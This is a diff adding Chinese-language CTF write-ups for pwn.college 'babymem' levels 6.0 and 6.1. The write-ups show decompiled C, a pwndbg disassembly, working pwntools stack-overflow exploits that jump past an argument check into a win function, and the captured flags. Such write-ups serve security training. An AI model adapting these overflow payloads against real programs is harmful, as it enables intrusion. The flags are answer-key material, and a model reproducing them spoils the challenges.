@@ -1943,7 +1943,7 @@ Flag: `pwn.college{AcH-0L9UpmOONC81mhni9OzJVhD.01N5IDL5cTNxgzW}`
 
 #### Write-up
 
-```c {22, 26} ins={23-24, 27-30} del={31, 33}
+```c {22, 26} ins={23-24, 27-30} del={31, 33} collapse={1-18, 37-43}
 __int64 challenge()
 {
   int *v0; // rax
@@ -2040,3 +2040,244 @@ target.recvall()
 #### Flag
 
 Flag: `pwn.college{A2rdZkIDLVjvpTrAPvlwpllVi7m.0FO5IDL5cTNxgzW}`
+
+### Level 6.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
+
+#### Write-up
+
+```c ins={8} collapse={1-4, 12-35}
+void __fastcall win_authed(int a1)
+{
+  int *v1; // rax
+  char *v2; // rax
+  int *v3; // rax
+  char *v4; // rax
+
+  if ( a1 == 0x1337 )
+  {
+    puts("You win! Here is your flag:");
+    flag_fd_5715 = open("/flag", 0);
+    if ( flag_fd_5715 < 0 )
+    {
+      v1 = __errno_location();
+      v2 = strerror(*v1);
+      printf("\n  ERROR: Failed to open the flag -- %s!\n", v2);
+      if ( geteuid() )
+      {
+        puts("  Your effective user id is not 0!");
+        puts("  You must directly run the suid binary in order to have the correct permissions!");
+      }
+      exit(-1);
+    }
+    flag_length_5716 = read(flag_fd_5715, &flag_5714, 0x100uLL);
+    if ( flag_length_5716 <= 0 )
+    {
+      v3 = __errno_location();
+      v4 = strerror(*v3);
+      printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
+      exit(-1);
+    }
+    write(1, &flag_5714, flag_length_5716);
+    puts("\n");
+  }
+}
+```
+
+思路是覆盖返回地址，返回到 `win_authed`。但是由于 `win_authed` 会先检查传入参数是否为 `0x1337`，匹配才给 flag，所以我们光返回到 `win_authed` 还不够。要么想办法传入参数 `0x1337`，要么返回到 `if` 判断之后的指令，直接跳过执行判断的部分。这里我们使用第二种方法。
+
+```c
+void __fastcall win_authed(int a1)
+{
+  if ( a1 == 0x1337 ) { /* ... */ }
+}
+```
+
+```asm wrap=false showLineNumbers=false ins={7-9} collapse={3-3, 13-67} "0x00000000004019a3"
+pwndbg> disass win_authed
+Dump of assembler code for function win_authed:
+   0x0000000000401987 <+0>: endbr64
+   0x000000000040198b <+4>: push   rbp
+   0x000000000040198c <+5>: mov    rbp,rsp
+   0x000000000040198f <+8>: sub    rsp,0x10
+   0x0000000000401993 <+12>: mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000401996 <+15>: cmp    DWORD PTR [rbp-0x4],0x1337
+   0x000000000040199d <+22>: jne    0x401aa1 <win_authed+282>
+   0x00000000004019a3 <+28>: lea    rdi,[rip+0x1746]        # 0x4030f0
+   0x00000000004019aa <+35>: call   0x401110 <puts@plt>
+   0x00000000004019af <+40>: mov    esi,0x0
+   0x00000000004019b4 <+45>: lea    rdi,[rip+0x1751]        # 0x40310c
+   0x00000000004019bb <+52>: mov    eax,0x0
+   0x00000000004019c0 <+57>: call   0x401170 <open@plt>
+   0x00000000004019c5 <+62>: mov    DWORD PTR [rip+0x4675],eax        # 0x406040 <flag_fd.5715>
+   0x00000000004019cb <+68>: mov    eax,DWORD PTR [rip+0x466f]        # 0x406040 <flag_fd.5715>
+   0x00000000004019d1 <+74>: test   eax,eax
+   0x00000000004019d3 <+76>: jns    0x401a22 <win_authed+155>
+   0x00000000004019d5 <+78>: call   0x401100 <__errno_location@plt>
+   0x00000000004019da <+83>: mov    eax,DWORD PTR [rax]
+   0x00000000004019dc <+85>: mov    edi,eax
+   0x00000000004019de <+87>: call   0x4011a0 <strerror@plt>
+   0x00000000004019e3 <+92>: mov    rsi,rax
+   0x00000000004019e6 <+95>: lea    rdi,[rip+0x172b]        # 0x403118
+   0x00000000004019ed <+102>: mov    eax,0x0
+   0x00000000004019f2 <+107>: call   0x401130 <printf@plt>
+   0x00000000004019f7 <+112>: call   0x401140 <geteuid@plt>
+   0x00000000004019fc <+117>: test   eax,eax
+   0x00000000004019fe <+119>: je     0x401a18 <win_authed+145>
+   0x0000000000401a00 <+121>: lea    rdi,[rip+0x1741]        # 0x403148
+   0x0000000000401a07 <+128>: call   0x401110 <puts@plt>
+   0x0000000000401a0c <+133>: lea    rdi,[rip+0x175d]        # 0x403170
+   0x0000000000401a13 <+140>: call   0x401110 <puts@plt>
+   0x0000000000401a18 <+145>: mov    edi,0xffffffff
+   0x0000000000401a1d <+150>: call   0x401190 <exit@plt>
+   0x0000000000401a22 <+155>: mov    eax,DWORD PTR [rip+0x4618]        # 0x406040 <flag_fd.5715>
+   0x0000000000401a28 <+161>: mov    edx,0x100
+   0x0000000000401a2d <+166>: lea    rsi,[rip+0x462c]        # 0x406060 <flag.5714>
+   0x0000000000401a34 <+173>: mov    edi,eax
+   0x0000000000401a36 <+175>: call   0x401150 <read@plt>
+   0x0000000000401a3b <+180>: mov    DWORD PTR [rip+0x471f],eax        # 0x406160 <flag_length.5716>
+   0x0000000000401a41 <+186>: mov    eax,DWORD PTR [rip+0x4719]        # 0x406160 <flag_length.5716>
+   0x0000000000401a47 <+192>: test   eax,eax
+   0x0000000000401a49 <+194>: jg     0x401a77 <win_authed+240>
+   0x0000000000401a4b <+196>: call   0x401100 <__errno_location@plt>
+   0x0000000000401a50 <+201>: mov    eax,DWORD PTR [rax]
+   0x0000000000401a52 <+203>: mov    edi,eax
+   0x0000000000401a54 <+205>: call   0x4011a0 <strerror@plt>
+   0x0000000000401a59 <+210>: mov    rsi,rax
+   0x0000000000401a5c <+213>: lea    rdi,[rip+0x1765]        # 0x4031c8
+   0x0000000000401a63 <+220>: mov    eax,0x0
+   0x0000000000401a68 <+225>: call   0x401130 <printf@plt>
+   0x0000000000401a6d <+230>: mov    edi,0xffffffff
+   0x0000000000401a72 <+235>: call   0x401190 <exit@plt>
+   0x0000000000401a77 <+240>: mov    eax,DWORD PTR [rip+0x46e3]        # 0x406160 <flag_length.5716>
+   0x0000000000401a7d <+246>: cdqe
+   0x0000000000401a7f <+248>: mov    rdx,rax
+   0x0000000000401a82 <+251>: lea    rsi,[rip+0x45d7]        # 0x406060 <flag.5714>
+   0x0000000000401a89 <+258>: mov    edi,0x1
+   0x0000000000401a8e <+263>: call   0x401120 <write@plt>
+   0x0000000000401a93 <+268>: lea    rdi,[rip+0x1758]        # 0x4031f2
+   0x0000000000401a9a <+275>: call   0x401110 <puts@plt>
+   0x0000000000401a9f <+280>: jmp    0x401aa2 <win_authed+283>
+   0x0000000000401aa1 <+282>: nop
+   0x0000000000401aa2 <+283>: leave
+   0x0000000000401aa3 <+284>: ret
+End of assembler dump.
+pwndbg>
+```
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, process, remote, gdb, p64
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-6-0"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug([elf.path], gdbscript=gdbscript)
+        else:
+            return process([elf.path])
+    else:
+        return remote(HOST, PORT)
+
+
+target = launch()
+
+payload = b"".ljust(0x58, b"A") + p64(0x4019A3)
+payload_size = str(len(payload)).encode()
+
+target.recvuntil(b"Payload size: ")
+target.sendline(payload_size)
+target.recvuntil("Send your payload")
+target.send(payload)
+
+target.recvall()
+```
+
+#### Flag
+
+Flag: `pwn.college{AusQ-DCHaivq4M4Tj9IZIsDv7m8.0VO5IDL5cTNxgzW}`
+
+### Level 6.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
+
+#### Write-up
+
+和上一题一样，只是需要计算一下 padding 大小和看一下返回到哪里，这里就不多赘述了。
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, process, remote, gdb, p64
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-6-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug([elf.path], gdbscript=gdbscript)
+        else:
+            return process([elf.path])
+    else:
+        return remote(HOST, PORT)
+
+
+target = launch()
+
+payload = b"".ljust(0x88, b"A") + p64(0x401DB0)
+payload_size = str(len(payload)).encode()
+
+target.recvuntil(b"Payload size: ")
+target.sendline(payload_size)
+target.recvuntil("Send your payload")
+target.send(payload)
+
+target.recvall()
+```
+
+#### Flag
+
+Flag: `pwn.college{Mlgp6gl7Ogp1vkjstLEXXOSldEM.0FMwMDL5cTNxgzW}`
